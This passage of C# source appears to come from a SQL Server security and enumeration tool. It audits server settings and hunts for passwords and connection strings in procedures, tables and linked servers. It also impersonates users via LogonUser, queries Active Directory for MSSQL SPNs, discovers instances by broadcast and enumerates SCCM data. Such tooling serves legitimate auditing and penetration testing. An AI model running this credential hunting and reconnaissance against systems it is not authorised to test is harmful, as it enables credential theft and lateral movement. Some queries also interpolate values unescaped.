             THEN 'WARNING - cross-db ownership chaining enabled' ELSE 'OK' END,

        2

    ORDER BY [Severity] DESC, [Check]";



            var table = await ExecuteQueryReturnTable(conn, query);





            Console.WriteLine("[+] Security Audit Results");

            Console.WriteLine("--------------------------------------------------");

            foreach (var row in table)

            {

                string status = row["Status"].ToString();

                int severity = Convert.ToInt32(row["Severity"]);





                if (severity == 3) Console.ForegroundColor = ConsoleColor.Red;

                else if (severity == 2) Console.ForegroundColor = ConsoleColor.Yellow;

                else Console.ForegroundColor = ConsoleColor.Green;



                Console.WriteLine($"{row["Check"],-30}: {status}");

            }

            Console.ResetColor();

            Console.WriteLine("--------------------------------------------------");

            Console.WriteLine("Severity: 3=Critical, 2=Warning, 1=Informational");

        }

        static async Task SearchSensitiveData(SqlConnection conn, string searchTerm = "password")
        {
            Console.WriteLine($"[*] Searching for '{searchTerm}' in database objects...");


            int majorVersion = await GetSqlMajorVersion(conn);


            string getColumnsQuery = @"
    SELECT 
        t.name AS TableName,
        c.name AS ColumnName
    FROM sys.tables t
    INNER JOIN sys.columns c ON t.object_id = c.object_id
    INNER JOIN sys.types ty ON c.user_type_id = ty.user_type_id
    WHERE 
        ty.name IN ('varchar', 'nvarchar', 'char', 'nchar', 'text', 'ntext')";

            var stringColumns = new List<Dictionary<string, object>>();
            try
            {
                stringColumns = await ExecuteQueryReturnTable(conn, getColumnsQuery);
            }
            catch
            {

                Console.WriteLine("[i] Could not enumerate string columns (older SQL version)");
            }


            var allResults = new List<Dictionary<string, object>>();


            try
            {
                string procQuery;
                if (majorVersion < 9)  
                {
                    procQuery = $@"
            SELECT 
                'Stored Procedure' AS [Type],
                OBJECT_NAME(id) AS [Object],
                SUBSTRING(text, CHARINDEX('{searchTerm}', text) - 20, 100) AS [Match]
            FROM syscomments
            WHERE text LIKE '%{searchTerm.Replace("'", "''")}%' COLLATE SQL_Latin1_General_CP1_CI_AS";
                }
                else
                {
                    procQuery = $@"
            SELECT 
                'Stored Procedure' AS [Type],
                OBJECT_NAME(id) AS [Object],
                SUBSTRING(text, CHARINDEX('{searchTerm}', text) - 20, 100) AS [Match]
            FROM sys.syscomments
            WHERE text LIKE '%{searchTerm.Replace("'", "''")}%' COLLATE SQL_Latin1_General_CP1_CI_AS";
                }

                var procResults = await ExecuteQueryReturnTable(conn, procQuery);
                allResults.AddRange(procResults);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Error searching stored procedures: {ex.Message}");
            }

             try
            {
                string linkedServerQuery;
                if (majorVersion >= 9) 
                {
                    linkedServerQuery = $@"
            SELECT 
                'Linked Server' AS [Type],
                srv.name AS [Object],
                srv.provider_string AS [Match]
            FROM sys.servers srv
            WHERE srv.provider_string LIKE '%{searchTerm.Replace("'", "''")}%' COLLATE SQL_Latin1_General_CP1_CI_AS";
                }
                else
                {
                    linkedServerQuery = $@"
            SELECT 
                'Linked Server' AS [Type],
                SRV_NAME AS [Object],
                '' AS [Match]
            FROM master..sysservers
            WHERE SRV_NAME LIKE '%{searchTerm.Replace("'", "''")}%' COLLATE SQL_Latin1_General_CP1_CI_AS";
                }

                var linkedServerResults = await ExecuteQueryReturnTable(conn, linkedServerQuery);
                allResults.AddRange(linkedServerResults);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Error searching linked servers: {ex.Message}");
            }

             
            foreach (var column in stringColumns)
            {
                string tableName = column["TableName"].ToString();
                string columnName = column["ColumnName"].ToString();

                try
                {
                     string safeTableName = tableName.Replace("'", "''");
                    string safeColumnName = columnName.Replace("'", "''");

                     string searchQuery = $@"
            SELECT TOP 1 
                'Table Data' AS [Type],
                '{safeTableName}.{safeColumnName}' AS [Object],
                '{searchTerm} found in column' AS [Match]
            FROM [{safeTableName}]
            WHERE CONVERT(NVARCHAR(MAX), [{safeColumnName}]) LIKE '%{searchTerm.Replace("'", "''")}%' COLLATE SQL_Latin1_General_CP1_CI_AS";

                    try
                    {
                        var result = await ExecuteQueryReturnTable(conn, searchQuery);
                        if (result.Count > 0)
                        {
                            allResults.Add(new Dictionary<string, object> {
                        { "Type", "Table Data" },
                        { "Object", $"{tableName}.{columnName}" },
                        { "Match", $"{searchTerm} found in column" }
                    });
                        }
                    }
                    catch (Exception ex)
                    {
                           Console.WriteLine($"[-] Error searching {tableName}.{columnName}: {ex.Message}");
                    }
                }
                catch (Exception ex)
                {
                       Console.WriteLine($"[-] Error processing {tableName}.{columnName}: {ex.Message}");
                }
            }

            if (allResults.Count == 0)
            {
                Console.WriteLine($"[i] No results found for '{searchTerm}'");
            }
            else
            {
                Console.WriteLine($"[+] Found {allResults.Count} results for '{searchTerm}'");
                PrintTable(allResults);
            }
        }
        static async Task ListLinkedServersDetailed(SqlConnection conn)

        {

            var query = @"

    SELECT 

        srv.name AS [ServerName],

        srv.product AS [Product],

        srv.provider AS [Provider],

        srv.data_source AS [DataSource],

        srv.location AS [Location],

        srv.provider_string AS [ProviderString],

        srv.catalog AS [Catalog],

        CASE srv.uses_self_credential WHEN 1 THEN 'Yes' ELSE 'No' END AS [UsesSelfCred],

        l.remote_name AS [RemoteLogin],

        l.modify_date AS [LastModified]

    FROM sys.servers srv

    LEFT JOIN sys.linked_logins l ON srv.server_id = l.server_id

    WHERE srv.server_id > 0";



            var table = await ExecuteQueryReturnTable(conn, query);

            PrintTable(table);

        }

        static async Task ExtractDatabaseSecrets(SqlConnection conn)
        {
             int majorVersion = await GetSqlMajorVersion(conn);

            var results = new List<Dictionary<string, object>>();

             try
            {
                string procQuery;
                if (majorVersion < 11)  
                {
                    procQuery = @"
            SELECT 
                'Stored Procedure' AS [Type],
                OBJECT_NAME(id) AS [Object],
                SUBSTRING(text, CHARINDEX('password', text) - 20, 100) AS [Match]
            FROM syscomments
            WHERE text LIKE '%password%' AND text NOT LIKE '%password_hash%'";
                }
                else
                {
                    procQuery = @"
            SELECT 
                'Stored Procedure' AS [Type],
                OBJECT_NAME(id) AS [Object],
                SUBSTRING(text, CHARINDEX('password', text) - 20, 100) AS [Match]
            FROM sys.syscomments
            WHERE text LIKE '%password%' AND text NOT LIKE '%password_hash%'";
                }

                var procResults = await ExecuteQueryReturnTable(conn, procQuery);
                results.AddRange(procResults);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Error searching stored procedures: {ex.Message}");
            }

             try
            {
                string connQuery;
                if (majorVersion < 11)  
                {
                    connQuery = @"
            SELECT 
                'Connection String' AS [Type],
                OBJECT_NAME(id) AS [Object],
                SUBSTRING(text, CHARINDEX('Server=', text) - 10, 100) AS [Match]
            FROM syscomments
            WHERE text LIKE '%Server=%' AND text LIKE '%Database=%'";
                }
                else
                {
                    connQuery = @"
            SELECT 
                'Connection String' AS [Type],
                OBJECT_NAME(id) AS [Object],
                SUBSTRING(text, CHARINDEX('Server=', text) - 10, 100) AS [Match]
            FROM sys.syscomments
            WHERE text LIKE '%Server=%' AND text LIKE '%Database=%'";
                }

                var connResults = await ExecuteQueryReturnTable(conn, connQuery);
                results.AddRange(connResults);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Error searching connection strings: {ex.Message}");
            }

             try
            {
                string linkedQuery;
                if (majorVersion < 10) 
                {
                    linkedQuery = @"
            SELECT 
                'Linked Server' AS [Type],
                SRV_NAME AS [Object],
                '' AS [Match]
            FROM master..sysservers";
                }
                else
                {
                    linkedQuery = @"
            SELECT 
                'Linked Server' AS [Type],
                name AS [Object],
                provider_string AS [Match]
            FROM sys.servers";
                }

                var linkedResults = await ExecuteQueryReturnTable(conn, linkedQuery);
                results.AddRange(linkedResults);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Error searching linked servers: {ex.Message}");
            }

            if (results.Count == 0)
            {
                Console.WriteLine("[i] No secrets found");
            }
            else
            {
                Console.WriteLine($"[+] Found {results.Count} potential secrets");
                PrintTable(results);
            }
        }
        static async Task ShowServiceAccounts(SqlConnection conn)

        {

            var query = @"

    SELECT 

        servicename AS [Service],

        service_account AS [Account],

        startup_type_desc AS [Startup],

        status_desc AS [Status]

    FROM sys.dm_server_services";



            var table = await ExecuteQueryReturnTable(conn, query);

            PrintTable(table);

        }



        #endregion
        #region Impersonation (LogonUser)
        static class Impersonate
        {
            [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
            static extern bool LogonUser(
                string lpszUsername,
                string lpszDomain,
                string lpszPassword,
                int dwLogonType,
                int dwLogonProvider,
                out SafeAccessTokenHandle phToken);
            public const int LOGON32_LOGON_NEW_CREDENTIALS = 9;
            public const int LOGON32_PROVIDER_DEFAULT = 0;
            public static IDisposable IfNeeded(Config cfg)
            {
                if (!cfg.UseKerberos || !cfg.HasCredentialPair) return null;
                string domain = string.IsNullOrEmpty(cfg.Domain) ? "." : cfg.Domain;
                string user = cfg.User;
                string pass = cfg.Password;
                if (!LogonUser(user, domain, pass, LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_DEFAULT, out SafeAccessTokenHandle token))
                {
                    int err = Marshal.GetLastWin32Error();
                    throw new System.ComponentModel.Win32Exception(err, "LogonUser failed");
                }
                var ctx = WindowsIdentity.Impersonate(token.DangerousGetHandle());
                return new DisposableImpersonation(ctx, token);
            }
        }
        class DisposableImpersonation : IDisposable
        {
            private readonly WindowsImpersonationContext _ctx;
            private readonly SafeAccessTokenHandle _token;
            public DisposableImpersonation(WindowsImpersonationContext ctx, SafeAccessTokenHandle token)
            {
                _ctx = ctx;
                _token = token;
            }
            public void Dispose()
            {
                try { _ctx?.Undo(); } catch { }
                try { _token?.Dispose(); } catch { }
            }
        }
        #endregion
        #region SPN checker (Active Directory)
        static class SpnChecker
        {
            public static List<string> FindSpnsForTarget(string targetHost)
            {
                var domainPath = GetDefaultNamingContext();
                if (domainPath == null) throw new Exception("Could not determine default naming context from RootDSE.");
                using (var root = new DirectoryEntry($"LDAP://{domainPath}"))
                {
                    using (var searcher = new DirectorySearcher(root)
                    {
                        Filter = $"(servicePrincipalName=MSSQLSvc/{targetHost}*)",
                        PropertiesToLoad = { "servicePrincipalName", "cn" },
                        SizeLimit = 1000
                    })
                    {
                        var spns = new List<string>();
                        foreach (SearchResult result in searcher.FindAll())
                        {
                            if (result.Properties.Contains("servicePrincipalName"))
                            {
                                foreach (var sp in result.Properties["servicePrincipalName"])
                                {
                                    var s = sp.ToString();
                                    if (s.StartsWith("MSSQLSvc/", StringComparison.OrdinalIgnoreCase))
                                        spns.Add(s);
                                }
                            }
                        }
                        return spns;
                    }
                }
            }
            static string GetDefaultNamingContext()
            {
                using (var rootDse = new DirectoryEntry("LDAP://RootDSE"))
                {
                    return rootDse.Properties["defaultNamingContext"].Value?.ToString();
                }
            }
            public static void PrintSpnAnalysis(string target, List<string> spns)
            {
                Console.WriteLine($"SPN analysis for [{target}]:");
                if (spns == null || spns.Count == 0)
                {
                    Console.WriteLine("  [!] No MSSQLSvc SPNs found for this host in AD. Kerberos likely will NOT be used.");
                    Console.WriteLine("  Recommendation: ensure the SQL service account has an SPN like 'MSSQLSvc/<fqdn>:port'.");
                }
                else
                {
                    Console.WriteLine($"  [+] Found {spns.Count} SPN(s):");
                    foreach (var s in spns) Console.WriteLine("    " + s);
                    Console.WriteLine("  Kerberos should be used if connecting with matching FQDN/port.");
                }
            }
        }
        #endregion
        #region Server Info
        static async Task ExtractServerInfo(SqlConnection conn)
        {

            if (conn.State != ConnectionState.Open)
            {
                Console.WriteLine("[*] Reopening closed connection...");
                try
                {
                    await conn.OpenAsync();
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[-] Failed to reopen connection: {ex.Message}");
                    return;
                }
            }

            Console.WriteLine("[*] Extracting comprehensive SQL server information");

            Console.WriteLine("[+] Basic Server Information");
            Console.WriteLine("------------------------------");
            await ExecuteInfoQuery(conn, "Computer Name", "SELECT @@SERVERNAME");
            await ExecuteInfoQuery(conn, "Domain Name", "SELECT SERVERPROPERTY('MachineName')");
            await ExecuteInfoQuery(conn, "SQL Service Name", "SELECT servicename FROM sys.dm_server_services");
            await ExecuteInfoQuery(conn, "SQL Service Account", "SELECT service_account FROM sys.dm_server_services");

            Console.WriteLine("[+] Authentication & Security");
            Console.WriteLine("------------------------------");
            await ExecuteInfoQuery(conn, "Authentication Mode", "SELECT CASE WHEN SERVERPROPERTY('IsIntegratedSecurityOnly') = 1 THEN 'Windows Authentication' ELSE 'Mixed Mode' END");
            await ExecuteInfoQuery(conn, "Current Login", "SELECT SUSER_SNAME()");
            await ExecuteInfoQuery(conn, "Current User", "SELECT USER_NAME()");
            await ExecuteInfoQuery(conn, "Is SysAdmin", "SELECT CASE WHEN IS_SRVROLEMEMBER('sysadmin') = 1 THEN 'True' ELSE 'False' END");
            await ExecuteInfoQuery(conn, "Is SecurityAdmin", "SELECT CASE WHEN IS_SRVROLEMEMBER('securityadmin') = 1 THEN 'True' ELSE 'False' END");

            Console.WriteLine("[+] Version & Configuration");
            Console.WriteLine("------------------------------");
            await ExecuteInfoQuery(conn, "SQL Version", "SELECT @@VERSION");
            await ExecuteInfoQuery(conn, "SQL Major Version", "SELECT SERVERPROPERTY('ProductMajorVersion')");
            await ExecuteInfoQuery(conn, "SQL Minor Version", "SELECT SERVERPROPERTY('ProductMinorVersion')");
            await ExecuteInfoQuery(conn, "SQL Build", "SELECT SERVERPROPERTY('ProductBuild')");
            await ExecuteInfoQuery(conn, "SQL Service Pack", "SELECT SERVERPROPERTY('ProductLevel')");
            await ExecuteInfoQuery(conn, "SQL Edition", "SELECT SERVERPROPERTY('Edition')");
            await ExecuteInfoQuery(conn, "SQL Collation", "SELECT SERVERPROPERTY('Collation')");
            await ExecuteInfoQuery(conn, "Max Memory (MB)", "SELECT value_in_use FROM sys.configurations WHERE name = 'max server memory (MB)'");
            await ExecuteInfoQuery(conn, "Min Memory (MB)", "SELECT value_in_use FROM sys.configurations WHERE name = 'min server memory (MB)'");

            Console.WriteLine("[+] Server Properties");
            Console.WriteLine("------------------------------");
            await ExecuteInfoQuery(conn, "Clustering", "SELECT CASE WHEN SERVERPROPERTY('IsClustered') = 1 THEN 'Yes' ELSE 'No' END");
            await ExecuteInfoQuery(conn, "AlwaysOn AG", "SELECT CASE WHEN SERVERPROPERTY('IsHadrEnabled') = 1 THEN 'Enabled' ELSE 'Disabled' END");
            await ExecuteInfoQuery(conn, "Full-Text Search", "SELECT CASE WHEN SERVERPROPERTY('IsFullTextInstalled') = 1 THEN 'Installed' ELSE 'Not Installed' END");
            await ExecuteInfoQuery(conn, "Analysis Services", "SELECT CASE WHEN SERVERPROPERTY('IsXTPSupported') = 1 THEN 'Supported' ELSE 'Not Supported' END");

            Console.WriteLine("[+] Database Information");
            Console.WriteLine("------------------------------");
            await ExecuteInfoQuery(conn, "Total Databases", "SELECT COUNT(*) FROM sys.databases");
            await ExecuteInfoQuery(conn, "Online Databases", "SELECT COUNT(*) FROM sys.databases WHERE state = 0");
            await ExecuteInfoQuery(conn, "Default Database", "SELECT name FROM sys.databases WHERE database_id = 1");
            await ExecuteInfoQuery(conn, "Master Database Path", "SELECT physical_name FROM sys.master_files WHERE database_id = 1 AND type_desc = 'ROWS'");

            Console.WriteLine("[+] Network Information");
            Console.WriteLine("------------------------------");
            await ExecuteInfoQuery(conn, "TCP Port", "SELECT local_tcp_port FROM sys.dm_exec_connections WHERE session_id = @@SPID");
            await ExecuteInfoQuery(conn, "Protocol", "SELECT net_transport FROM sys.dm_exec_connections WHERE session_id = @@SPID");
            await ExecuteInfoQuery(conn, "Authentication Scheme", "SELECT auth_scheme FROM sys.dm_exec_connections WHERE session_id = @@SPID");

          
            Console.WriteLine("[+] Performance Metrics");
            Console.WriteLine("------------------------------");
            await ExecuteInfoQuery(conn, "Active Sessions", "SELECT COUNT(*) FROM sys.dm_exec_sessions WHERE is_user_process = 1");
            await ExecuteInfoQuery(conn, "CPU Time (ms)", "SELECT cpu_time FROM sys.dm_exec_sessions WHERE session_id = @@SPID");
            await ExecuteInfoQuery(conn, "Memory Usage (MB)", "SELECT (physical_memory_in_use_kb / 1024) FROM sys.dm_os_process_memory");

            Console.WriteLine("[+] Extended Procedures");
            Console.WriteLine("------------------------------");
            try
            {
                using (var cmd = new SqlCommand("SELECT value_in_use FROM sys.configurations WHERE name = 'xp_cmdshell'", conn))
                {
                    var result = await cmd.ExecuteScalarAsync();
                    Console.WriteLine($"|--> xp_cmdshell          : {(result?.ToString() == "1" ? "Enabled" : "Disabled")}");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"|--> xp_cmdshell          : Error checking status ({ex.Message})");
            }

            try
            {
                using (var cmd = new SqlCommand("SELECT value_in_use FROM sys.configurations WHERE name = 'Ole Automation Procedures'", conn))
                {
                    var result = await cmd.ExecuteScalarAsync();
                    Console.WriteLine($"|--> OLE Automation      : {(result?.ToString() == "1" ? "Enabled" : "Disabled")}");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"|--> OLE Automation      : Error checking status ({ex.Message})");
            }

            try
            {
                using (var cmd = new SqlCommand("SELECT value_in_use FROM sys.configurations WHERE name = 'clr enabled'", conn))
                {
                    var result = await cmd.ExecuteScalarAsync();
                    Console.WriteLine($"|--> CLR Integration        : {(result?.ToString() == "1" ? "Enabled" : "Disabled")}");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"|--> CLR Integration        : Error checking status ({ex.Message})");
            }
        }

        static void EnumerateDomainInstances()
        {
            try
            {
                Console.WriteLine("[*] Enumerating SQL Server instances...");
                List<SqlInstanceInfo> instances = new List<SqlInstanceInfo>();


                try
                {
                    var enumerator = SqlDataSourceEnumerator.Instance;
                    DataTable domainInstances = enumerator.GetDataSources();

                    foreach (DataRow row in domainInstances.Rows)
                    {
                        instances.Add(new SqlInstanceInfo
                        {
                            ServerName = row["ServerName"]?.ToString(),
                            InstanceName = row["InstanceName"]?.ToString() ?? "MSSQLSERVER",
                            Version = row["Version"]?.ToString() ?? "Unknown",
                            IsClustered = row["IsClustered"]?.ToString() ?? "No"
                        });
                    }
                }
                catch
                {

                }


                if (instances.Count == 0)
                {
                    Console.WriteLine("[*] No domain instances found, trying workgroup discovery...");
                    DiscoverWorkgroupInstances(instances);
                }


                if (instances.Count == 0)
                {
                    Console.WriteLine("[-] No SQL Server instances found.");
                    return;
                }

                Console.WriteLine("Discovered instances:");
                Console.WriteLine("Server Name          Instance Name         Version      IsClustered");
                Console.WriteLine("---------------------------------------------------------------");
                foreach (var instance in instances)
                {
                    Console.WriteLine($"{instance.ServerName.PadRight(20)} {instance.InstanceName.PadRight(20)} " +
                                      $"{instance.Version.PadRight(12)} {instance.IsClustered}");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Instance enumeration failed: {ex.Message}");
            }
        }

        class SqlInstanceInfo
        {
            public string ServerName { get; set; }
            public string InstanceName { get; set; }
            public string Version { get; set; }
            public string IsClustered { get; set; }
        }

        static void DiscoverWorkgroupInstances(List<SqlInstanceInfo> instances)
        {
            try
            {

                string localServer = Environment.MachineName;
                instances.Add(new SqlInstanceInfo
                {
                    ServerName = localServer,
                    InstanceName = "MSSQLSERVER",
                    Version = "Unknown",
                    IsClustered = "No"
                });


                string[] commonInstances = { "SQLEXPRESS", "MSSQLSERVER" };


                try
                {
                    UdpClient udpClient = new UdpClient();
                    udpClient.Client.ReceiveTimeout = 500;
                    byte[] request = new byte[] { 0x02 };  
                    IPEndPoint endPoint = new IPEndPoint(IPAddress.Broadcast, 1434);

                    udpClient.Send(request, request.Length, endPoint);
                    IPEndPoint remote = new IPEndPoint(IPAddress.Any, 0);

                    while (true)
                    {
                        try
                        {
                            byte[] response = udpClient.Receive(ref remote);
                            string respStr = Encoding.ASCII.GetString(response);
                            ParseBrowserResponse(respStr, instances);
                        }
                        catch (SocketException ex) when (ex.SocketErrorCode == SocketError.TimedOut)
                        {
                            break;
                        }
                    }
                }
                catch
                {

                }


                try
                {
                    using (var searcher = new ManagementObjectSearcher("SELECT * FROM Win32_ComputerSystem"))
                    {
                        foreach (ManagementObject obj in searcher.Get())
                        {
                            string name = obj["Name"]?.ToString();
                            if (!string.IsNullOrEmpty(name) &&
                                !instances.Any(i => i.ServerName.Equals(name, StringComparison.OrdinalIgnoreCase)))
                            {
                                instances.Add(new SqlInstanceInfo
                                {
                                    ServerName = name,
                                    InstanceName = "MSSQLSERVER",
                                    Version = "Unknown",
                                    IsClustered = "No"
                                });
                            }
                        }
                    }
                }
                catch
                {

                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Workgroup discovery error: {ex.Message}");
            }
        }

        static void ParseBrowserResponse(string response, List<SqlInstanceInfo> instances)
        {
            try
            {

                string[] parts = response.Split(';');
                string serverName = "";
                string instanceName = "";
                string version = "Unknown";
                string clustered = "No";

                for (int i = 0; i < parts.Length - 1; i++)
                {
                    if (parts[i] == "ServerName") serverName = parts[++i];
                    if (parts[i] == "InstanceName") instanceName = parts[++i];
                    if (parts[i] == "Version") version = parts[++i];
                    if (parts[i] == "IsClustered") clustered = parts[++i];
                }

                if (!string.IsNullOrEmpty(serverName))
                {
                    instances.Add(new SqlInstanceInfo
                    {
                        ServerName = serverName,
                        InstanceName = string.IsNullOrEmpty(instanceName) ? "MSSQLSERVER" : instanceName,
                        Version = version,
                        IsClustered = clustered
                    });
                }
            }
            catch
            {

            }
        }
        static async Task ExecuteInfoQuery(SqlConnection conn, string label, string query)
        {
            try
            {
                using (var cmd = new SqlCommand(query, conn))
                {
                    var result = await cmd.ExecuteScalarAsync();
                    Console.WriteLine($"|--> {label,-25}: {result ?? "N/A"}");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"|--> {label,-25}: Error ({ex.Message})");
            }
        }
        #endregion
        #region Process Creation (for --runas)
        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern bool CreateProcessWithLogonW(
            string lpUsername,
            string lpDomain,
            string lpPassword,
            int dwLogonFlags,
            string lpApplicationName,
            string lpCommandLine,
            int dwCreationFlags,
            int lpEnvironment,
            string lpCurrentDirectory,
            ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CloseHandle(IntPtr hObject);


        const int LOGON_WITH_PROFILE = 0x00000001;
        const int LOGON_NETCREDENTIALS_ONLY = 0x00000002;
        const int CREATE_UNICODE_ENVIRONMENT = 0x00000400;
        const int CREATE_NEW_CONSOLE = 0x00000010;
        const uint INFINITE = 0xFFFFFFFF;

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        struct STARTUPINFO
        {
            public int cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public int dwX;
            public int dwY;
            public int dwXSize;
            public int dwYSize;
            public int dwXCountChars;
            public int dwYCountChars;
            public int dwFillAttribute;
            public int dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }
        #endregion


        #region SCCM 
        static async Task<bool> IsSccmDatabase(SqlConnection conn)
        {
            string query = @"
    SELECT 
        CASE WHEN EXISTS (SELECT 1 FROM sys.tables WHERE name = 'SiteDefinition') THEN 1
             WHEN EXISTS (SELECT 1 FROM sys.tables WHERE name = 'SC_SiteDefinition') THEN 1
             ELSE 0
        END AS IsSccm";

            try
            {
                var result = await ExecuteScalarAsync(conn, query);
                return result != null && result != DBNull.Value && Convert.ToInt32(result) == 1;
            }
            catch
            {
                return false;
            }
        }

        static async Task<string> GetSccmVersion(SqlConnection conn)
        {
            try
            {

                var result = await ExecuteScalarAsync(conn, @"
            SELECT TOP 1 Build FROM vSMS_Site 
            WHERE SiteCode = (SELECT TOP 1 SiteCode FROM vSMS_Site)");

                if (result != null && result != DBNull.Value)
                    return result.ToString();


                result = await ExecuteScalarAsync(conn, @"
            SELECT TOP 1 Version FROM SC_SiteDefinition");

                return result != null && result != DBNull.Value ? result.ToString() : "Unknown";
            }
            catch
            {
                return "Unknown";
            }
        }

        static async Task<string> GetSccmType(SqlConnection conn)
        {
            try
            {
                if (await ExecuteScalarAsync(conn, "SELECT 1 FROM sys.tables WHERE name = 'SiteDefinition'") != null)
                    return "Primary Site";

                if (await ExecuteScalarAsync(conn, "SELECT 1 FROM sys.tables WHERE name = 'SC_SiteDefinition'") != null)
                    return "Central Administration Site";

                return "Unknown SCCM Type";
            }
            catch
            {
                return "Unknown";
            }
        }

        static async Task DetectAndReportSccm(SqlConnection conn)
        {
            if (!await IsSccmDatabase(conn))
            {
                Console.WriteLine("[-] Not connected to an SCCM database");
                Console.WriteLine("[i] SCCM databases typically contain tables like:");
                Console.WriteLine("    - SiteDefinition");
                Console.WriteLine("    - SC_SiteDefinition");
                Console.WriteLine("    - v_R_System");
                Console.WriteLine("    - v_Collection");
                return;
            }

            Console.WriteLine("[+] SCCM Database Detected");
            Console.WriteLine($"|--> Type: {await GetSccmType(conn)}");
            Console.WriteLine($"|--> Version: {await GetSccmVersion(conn)}");


            try
            {
                var siteCode = await ExecuteScalarAsync(conn, "SELECT TOP 1 SiteCode FROM vSMS_Site");
                if (siteCode != null && siteCode != DBNull.Value)
                    Console.WriteLine($"|--> Site Code: {siteCode}");
            }
            catch { /* ignore */ }


            try
            {
                var hierarchyLevel = await ExecuteScalarAsync(conn, @"
            SELECT CASE WHEN EXISTS (SELECT 1 FROM vSMS_CAS) THEN 'Central Administration Site'
                       WHEN EXISTS (SELECT 1 FROM vSMS_Site WHERE ParentSiteCode IS NOT NULL) THEN 'Primary Site'
                       ELSE 'Secondary Site'
                  END");
                if (hierarchyLevel != null && hierarchyLevel != DBNull.Value)
                    Console.WriteLine($"|--> Hierarchy Level: {hierarchyLevel}");
            }
            catch { /* ignore */ }
        }
        static async Task ShowSccmInventory(SqlConnection conn)
        {
            if (!await IsSccmDatabase(conn))
            {
                Console.WriteLine("[-] Not connected to an SCCM database");
                return;
            }

            Console.WriteLine("[*] Gathering SCCM inventory data...");


            string hwQuery = @"
    SELECT TOP 50 
        sys.Netbios_Name0 AS Hostname,
        os.Caption0 AS OS,
        cs.Manufacturer0 AS Manufacturer,
        cs.Model0 AS Model,
        processor.Name0 AS Processor,
        memory.TotalPhysicalMemory0 / 1024 AS RAM_MB,
        disk.Size0 / 1024 AS Disk_GB
    FROM 
        v_R_System sys
        LEFT JOIN v_GS_OPERATING_SYSTEM os ON sys.ResourceID = os.ResourceID
        LEFT JOIN v_GS_COMPUTER_SYSTEM cs ON sys.ResourceID = cs.ResourceID
        LEFT JOIN v_GS_PROCESSOR processor ON sys.ResourceID = processor.ResourceID
        LEFT JOIN v_GS_X86_PC_MEMORY memory ON sys.ResourceID = memory.ResourceID
        LEFT JOIN v_GS_LOGICAL_DISK disk ON sys.ResourceID = disk.ResourceID AND disk.DeviceID0 = 'C:'";


            string swQuery = @"
    SELECT TOP 20 
        DisplayName0 AS Application,
        COUNT(*) AS InstallCount
    FROM 
        v_GS_INSTALLED_SOFTWARE
    GROUP BY 
        DisplayName0
    ORDER BY 
        InstallCount DESC";

            try
            {
                Console.WriteLine("\n[+] Hardware Inventory (Top 50 Systems):");
                var hwResults = await ExecuteQueryReturnTable(conn, hwQuery);
                PrintTable(hwResults);

                Console.WriteLine("\n[+] Top Installed Applications:");
                var swResults = await ExecuteQueryReturnTable(conn, swQuery);
                PrintTable(swResults);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Error retrieving SCCM inventory: {ex.Message}");
            }
        }

        static async Task ShowSccmCollections(SqlConnection conn, string filter = null)
        {
            if (!await IsSccmDatabase(conn))
            {
                Console.WriteLine("[-] Not connected to an SCCM database");
                return;
            }

            Console.WriteLine("[*] Listing SCCM collections...");

            string query = @"
    SELECT 
        CollectionID AS ID,
        Name,
        ParentCollectionID AS ParentID,
        MemberCount,
        LimitToCollectionID AS LimitID,
        (SELECT Name FROM v_Collection WHERE CollectionID = c.LimitToCollectionID) AS LimitName
    FROM 
        v_Collection c";

            if (!string.IsNullOrEmpty(filter))
            {
                query += $" WHERE Name LIKE '%{filter.Replace("'", "''")}%' OR CollectionID LIKE '%{filter.Replace("'", "''")}%'";
            }

            query += " ORDER BY Name";

            try
            {
                var results = await ExecuteQueryReturnTable(conn, query);
                if (results.Count == 0)
                {
                    Console.WriteLine("[!] No collections found matching the filter");
                    return;
                }

                PrintTable(results);


                if (results.Count > 0)
                {
                    string collId = results[0]["ID"].ToString();
                    Console.WriteLine($"\n[+] Showing membership for collection: {results[0]["Name"]} ({collId})");

                    string membersQuery = $@"
            SELECT TOP 20
                sys.Netbios_Name0 AS Hostname,
                sys.User_Name0 AS Username,
                sys.Client_Version0 AS ClientVersion
            FROM 
                v_R_System sys
                INNER JOIN v_FullCollectionMembership fcm ON sys.ResourceID = fcm.ResourceID
            WHERE 
                fcm.CollectionID = '{collId}'
            ORDER BY 
                Hostname";

                    var members = await ExecuteQueryReturnTable(conn, membersQuery);
                    PrintTable(members);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Error retrieving SCCM collections: {ex.Message}");
            }
        }

        static async Task ShowSccmDeployments(SqlConnection conn)
        {
            if (!await IsSccmDatabase(conn))
            {
                Console.WriteLine("[-] Not connected to an SCCM database");
                return;
            }

            Console.WriteLine("[*] Listing SCCM deployments...");

            string query = @"
    SELECT 
        a.PackageID,
        p.Name AS PackageName,
        a.ProgramName,
        a.Required,
        a.OfferTypeID,
